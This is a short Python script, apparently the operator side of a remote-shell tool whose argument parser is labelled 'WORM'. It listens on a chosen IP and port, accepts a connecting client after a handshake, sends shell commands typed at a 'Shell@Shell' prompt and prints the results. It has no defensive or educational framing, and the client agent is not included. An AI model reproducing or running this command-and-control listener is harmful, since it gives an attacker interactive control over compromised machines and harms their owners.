#!/usr/bin/env python
# _*_ coding: utf-8 _*_

import socket
import argparse


def main():
    parse = argparse.ArgumentParser(description="WORM")
    parse.add_argument('-i', '--interface', help="Listening IP", dest='host',required=True)
    parse.add_argument('-p', '--port', help="Listening port", dest='port', required=True)
    args = parse.parse_args()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((args.host, int(args.port)))
        s.listen(1)

        while True:
            client, addr = s.accept()
            print(f"Host {addr} is connected")

            handshake = client.recv(1024).decode('utf-8')

            if handshake == "1":
                while True:
                    command = input('Shell@Shell: ')
                    if command == "exit":
                        client.send("exit".encode('utf-8'))
                        client.close()
                        break
                    client.send(command.encode('utf-8'))
                    res = client.recv(5120)
                    print(res.decode('utf-8'))
    except KeyboardInterrupt:
        client.close()
        return
    except:
        print('Unexpected error ocurred')
        return


if __name__ == '__main__':
    try:
        main()
    except:
        exit()
